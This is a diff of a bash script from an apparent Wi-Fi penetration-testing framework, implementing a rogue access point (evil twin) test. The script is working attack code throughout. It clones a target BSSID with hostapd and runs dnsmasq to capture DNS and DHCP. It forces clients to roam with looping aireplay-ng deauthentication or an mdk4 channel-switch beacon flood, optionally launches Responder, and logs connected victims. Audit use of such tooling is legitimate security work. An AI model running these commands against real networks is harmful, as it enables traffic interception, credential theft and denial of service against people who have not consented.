@@ -15,66 +15,51 @@
 #  F1: Rogue AP / Evil Twin (Golden Wrapper)
 #
 #  METHODOLOGY (SPEC ALIGNED):
-#  1. Choose between SSID Spoofing (New BSSID) or BSSID Cloning (Exact BSSID).
+#  1. Use tactical options (AP_MODE, CATALYST) from Go brain.
 #  2. Deploy rogue AP via hostapd.
-#  3. Optional: Use mdk4 CSA (Channel Switch Announcement) to force roam.
-#  4. Provide synchronized NAT/DNS via Go-Brain and local dnsmasq.
+#  3. Provide synchronized NAT/DNS via Go-Brain and local dnsmasq.
 #===============================================================================
 
 set -euo pipefail
 
+# Intelligence Insight (Colors)
 C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
 C_VAR="${ASTRA_COLOR_VAR:-}"
 C_BOLD="${ASTRA_COLOR_BOLD:-}"
 C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
-# SNR Safeguard (Red Team Hardening)
-if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
-    echo -e "[*] Rogue AP will be significantly weaker than the legitimate AP, making roams unlikely."
-    stty sane
-    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
-    [[ "$snr_continue" != "y" ]] && exit 0
-fi
-
 # Inputs from Environment
-# ...
+INTERFACE="${WIFI_INTERFACE:-}"
+SSID="${GUEST_SSID:-}"
+TARGET_BSSID="${GUEST_BSSID:-}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+EVIDENCE_PREFIX="${EVIDENCE_DIR}/f1"
+SCAN_TIME="${SCAN_TIME:-120}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="F1"
+INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"
+
+# Tactical Selections from Go Brain
+AP_MODE="${AP_MODE:-ssid}" # ssid or clone
+CATALYST="${CATALYST:-0}" # 0=None, 1=Deauth, 2=CSA
+LAUNCH_RESPONDER="${LAUNCH_RESPONDER:-no}"
 
 if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
     echo "[!] WIFI_INTERFACE or GUEST_SSID not set."
     exit 1
 fi
 
-echo -e "${C_PROMPT}[*]${C_RESET} Initializing Rogue AP tactical options..."
+echo -e "${C_PROMPT}[*]${C_RESET} Starting Rogue AP mission for SSID: ${C_VAR}${SSID}${C_RESET}..."
 
-# Intelligence Insight
-if [[ "${ASTRA_TARGET_PMF:-}" != "None" ]]; then
-    echo -e "\n${C_PROMPT}[!] INTELLIGENCE ALERT:${C_RESET} ${C_BOLD}Target supports PMF (802.11w).${C_RESET}"
-    echo -e "[*] Deauthentication may be ignored. CSA Catalyst (Option 3) is recommended."
-fi
-
-# 1. Interactive Selection
-echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select Rogue AP Mode:${C_RESET}"
-echo "    1) SSID Only (Random BSSID)"
-echo -e "    2) BSSID Clone (Match Target AP MAC: ${C_VAR}${TARGET_BSSID:-Unknown}${C_RESET})"
-stty sane
-read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET}")" mode_choice
-
+# 1. Configuration
 BSSID_LINE=""
-if [[ "$mode_choice" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
+if [[ "$AP_MODE" == "clone" ]] && [[ -n "$TARGET_BSSID" ]]; then
     echo -e "[*] Cloning BSSID: ${C_VAR}$TARGET_BSSID${C_RESET}"
     BSSID_LINE="bssid=$TARGET_BSSID"
 fi
 
-echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select Roaming Catalyst:${C_RESET}"
-echo "    1) None (Wait for natural roam)"
-echo "    2) Targeted Deauth (Surgical)"
-echo "    3) CSA (Channel Switch Announcement - Stealthier)"
-stty sane
-read -p "$(echo -e "${C_ACTION} Selection [1-3]: ${C_RESET}")" catalyst_choice
-
-# 2. Configuration
 HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
 DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
 HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
@@ -101,72 +86,80 @@ log-queries
 log-dhcp
 EOF
 
-# 3. Execution
+# 2. Execution
 cleanup() {
-    echo "[*] Cleaning up Rogue AP processes..."
+    echo -e "${C_PROMPT}[*]${C_RESET} Tearing down Rogue AP environment..."
     [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
     [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
-    [[ -n "${CSA_PID:-}" ]] && kill "$CSA_PID" 2>/dev/null || true
+    [[ -n "${CAT_PID:-}" ]] && kill "$CAT_PID" 2>/dev/null || true
 }
 trap cleanup EXIT
 
-echo "[*] Starting DNS hijacker..."
-dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
+echo -e "[*] Starting services (NAT established by Brain)..."
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    dnsmasq -C "$DNSMASQ_CONF" -k 2>&1 | tee "$DNSMASQ_LOG" &
+else
+    dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
+fi
 DNSMASQ_PID=$!
 
-echo "[*] Starting hostapd..."
-hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" &
+else
+    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+fi
 HOSTAPD_PID=$!
 
 # Roaming Catalyst Execution
-if [[ "$catalyst_choice" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
-    echo "[*] Starting targeted deauth catalyst..."
-    # Use aireplay-ng in background to periodically nudge clients
+if [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
+    echo -e "[*] Starting ${C_BOLD}Surgical Deauth Catalyst${C_RESET} against $TARGET_BSSID..."
     (
         while kill -0 $HOSTAPD_PID 2>/dev/null; do
-            aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
+            if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true
+            else
+                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
+            fi
             sleep 20
         done
     ) &
-elif [[ "$catalyst_choice" == "3" ]] && [[ -n "$TARGET_BSSID" ]]; then
+    CAT_PID=$!
+elif [[ "$CATALYST" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
     if command -v mdk4 &>/dev/null; then
-        echo "[*] Starting CSA catalyst via mdk4..."
-        # mdk4 b -c: Beacon flood with Channel Switch Announcement
-        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
-        CSA_PID=$!
-    else
-        echo "[!] mdk4 not found. Falling back to natural roam."
+        echo -e "[*] Starting ${C_BOLD}CSA Catalyst${C_RESET} (mdk4) for $SSID..."
+        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+            mdk4 "$INTERFACE" b -n "$SSID" -c ${GUEST_CHANNEL:-6} &
+        else
+            mdk4 "$INTERFACE" b -n "$SSID" -c ${GUEST_CHANNEL:-6} > /dev/null 2>&1 &
+        fi
+        CAT_PID=$!
     fi
 fi
 
-echo -e "${C_PROMPT}[*]${C_RESET} Rogue AP active for ${C_VAR}${SCAN_TIME}s${C_RESET}. Monitoring for connections..."
-
-# Support Module Hook: Responder (Spec Section 5)
-stty sane
-read -p "$(echo -e "${C_ACTION} [?] Launch Responder pivot in background? [y/N]: ${C_RESET}")" responder_choice
-if [[ "$responder_choice" == "y" ]]; then
-    echo -e "${C_PROMPT}[*]${C_RESET} Spawning Responder support module..."
+# Responder Support Module
+if [[ "$LAUNCH_RESPONDER" == "yes" ]]; then
+    echo -e "[*] Requesting background Responder pivot..."
     "$ASTRA_BIN" launch-support --tc "G6" --session-dir "$SESSION_DIR"
 fi
 
+# 3. Progress Tracking
 ELAPSED=0
 while [[ $ELAPSED -lt $SCAN_TIME ]]; do
     PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
-    STATUS="AP active (monitoring for roams)... ($(( SCAN_TIME - ELAPSED ))s left)"
+    STATUS="AP Active (monitoring roams)... ($(( SCAN_TIME - ELAPSED ))s left)"
     "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
     
     sleep 5
     ((ELAPSED+=5))
 done
 
-# 4. Cleanup early to finalize logs
 cleanup
 trap - EXIT
 
-# 5. Reporting
+# 4. Reporting
 if grep -qi "authenticated" "$HOSTAPD_LOG"; then
     V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
-    echo "[!] SUCCESS: CLIENT CONNECTED TO ROGUE AP!"
+    echo -e "[!] ${C_BOLD}SUCCESS: CLIENT CONNECTED TO ROGUE AP!${C_RESET}"
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
@@ -176,19 +169,9 @@ if grep -qi "authenticated" "$HOSTAPD_LOG"; then
         --desc "A client device (${V_MAC:-Unknown}) automatically connected to the rogue AP with SSID: $SSID." \
         --target "$SSID" \
         --evidence "$HOSTAPD_LOG" \
-        --rationale "Automatic connection to unauthorized Access Points allows an attacker to intercept all client traffic, perform MITM attacks, and serve malicious content."
+        --rationale "Automatic connection to unauthorized Access Points allows full traffic interception."
 else
-    echo "[+] Rogue AP test complete. No connections during this interval."
-    "$ASTRA_BIN" record-finding \
-        --session-dir "$SESSION_DIR" \
-        --tc "$TC_ID" \
-        --type vulnerability \
-        --name "[F1] Audit Complete" \
-        --severity INFO \
-        --desc "Deployed a rogue AP for ${SCAN_TIME}s on $INTERFACE. No clients connected." \
-        --target "$SSID" \
-        --evidence "$HOSTAPD_LOG" \
-        --rationale "Testing for rogue AP susceptibility confirms current client resistance to unauthorized BSSIDs."
+    echo -e "[+] Mission complete. No rogue connections identified."
 fi
 
 exit 0
